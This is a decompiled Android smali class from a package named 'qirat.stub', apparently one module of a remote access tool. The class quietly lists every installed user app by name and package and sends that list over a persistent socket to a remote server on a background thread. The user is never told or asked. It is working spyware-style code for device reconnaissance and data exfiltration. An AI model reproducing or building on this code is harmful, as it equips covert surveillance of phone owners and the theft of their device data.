.class public Lcom/qirat/stub/ApplicationManager;
.super Ljava/lang/Object;
.source "ApplicationManager.java"


# static fields
.field private static final TAG:Ljava/lang/String; = "ApplicationManager"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 14
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static getApplicationsList(Landroid/content/Context;)Lorg/json/JSONObject;
    .locals 10
    .param p0, "context"    # Landroid/content/Context;

    .line 19
    const-string v0, "ApplicationManager"

    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 20
    .local v1, "appListJSON":Lorg/json/JSONObject;
    new-instance v2, Lorg/json/JSONArray;

    invoke-direct {v2}, Lorg/json/JSONArray;-><init>()V

    .line 21
    .local v2, "list":Lorg/json/JSONArray;
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v3

    .line 22
    .local v3, "pm":Landroid/content/pm/PackageManager;
    const/16 v4, 0x80

    invoke-virtual {v3, v4}, Landroid/content/pm/PackageManager;->getInstalledApplications(I)Ljava/util/List;

    move-result-object v4

    .line 25
    .local v4, "packages":Ljava/util/List;, "Ljava/util/List<Landroid/content/pm/ApplicationInfo;>;"
    :try_start_0
    invoke-interface {v4}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v5

    :goto_0
    invoke-interface {v5}, Ljava/util/Iterator;->hasNext()Z

    move-result v6

    if-eqz v6, :cond_1

    invoke-interface {v5}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/content/pm/ApplicationInfo;

    .line 27
    .local v6, "applicationInfo":Landroid/content/pm/ApplicationInfo;
    iget v7, v6, Landroid/content/pm/ApplicationInfo;->flags:I

    and-int/lit8 v7, v7, 0x1

    if-nez v7, :cond_0

    .line 28
    new-instance v7, Lorg/json/JSONObject;

    invoke-direct {v7}, Lorg/json/JSONObject;-><init>()V

    .line 29
    .local v7, "app":Lorg/json/JSONObject;
    const-string v8, "appName"

    invoke-virtual {v6, v3}, Landroid/content/pm/ApplicationInfo;->loadLabel(Landroid/content/pm/PackageManager;)Ljava/lang/CharSequence;

    move-result-object v9

    invoke-interface {v9}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v7, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 30
    const-string v8, "packageName"

    iget-object v9, v6, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v7, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 31
    invoke-virtual {v2, v7}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    .line 33
    .end local v6    # "applicationInfo":Landroid/content/pm/ApplicationInfo;
    .end local v7    # "app":Lorg/json/JSONObject;
    :cond_0
    goto :goto_0

    .line 34
    :cond_1
    const-string v5, "appList"

    invoke-virtual {v1, v5, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 35
    const-string v5, "Application list collection complete."

    invoke-static {v0, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 36
    return-object v1

    .line 37
    :catch_0
    move-exception v5

    .line 38
    .local v5, "e":Lorg/json/JSONException;
    const-string v6, "Error creating JSON for application list"

    invoke-static {v0, v6, v5}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 39
    const/4 v0, 0x0

    return-object v0
.end method

.method static synthetic lambda$sendApplicationsListToServer$0(Landroid/content/Context;)V
    .locals 4
    .param p0, "context"    # Landroid/content/Context;

    .line 45
    invoke-static {p0}, Lcom/qirat/stub/ApplicationManager;->getApplicationsList(Landroid/content/Context;)Lorg/json/JSONObject;

    move-result-object v0

    .line 46
    .local v0, "appList":Lorg/json/JSONObject;
    const-string v1, "ApplicationManager"

    if-nez v0, :cond_0

    .line 47
    const-string v2, "Cannot send application list, the collected list is null."

    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 48
    return-void

    .line 52
    :cond_0
    invoke-static {p0}, Lcom/qirat/stub/Socket;->getInstance(Landroid/content/Context;)Lcom/qirat/stub/Socket;

    move-result-object v2

    .line 53
    .local v2, "socket":Lcom/qirat/stub/Socket;
    invoke-virtual {v2}, Lcom/qirat/stub/Socket;->isConnected()Z

    move-result v3

    if-eqz v3, :cond_1

    .line 54
    const-string v3, "Sending application list to server..."

    invoke-static {v1, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 55
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "APP_LIST:"

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Lcom/qirat/stub/Socket;->sendData(Ljava/lang/String;)V

    goto :goto_0

    .line 57
    :cond_1
    const-string v3, "Cannot send application list, socket not connected."

    invoke-static {v1, v3}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 59
    :goto_0
    return-void
.end method

.method public static sendApplicationsListToServer(Landroid/content/Context;)V
    .locals 2
    .param p0, "context"    # Landroid/content/Context;

    .line 44
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/qirat/stub/ApplicationManager$$ExternalSyntheticLambda0;

    invoke-direct {v1, p0}, Lcom/qirat/stub/ApplicationManager$$ExternalSyntheticLambda0;-><init>(Landroid/content/Context;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 59
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 60
    return-void
.end method
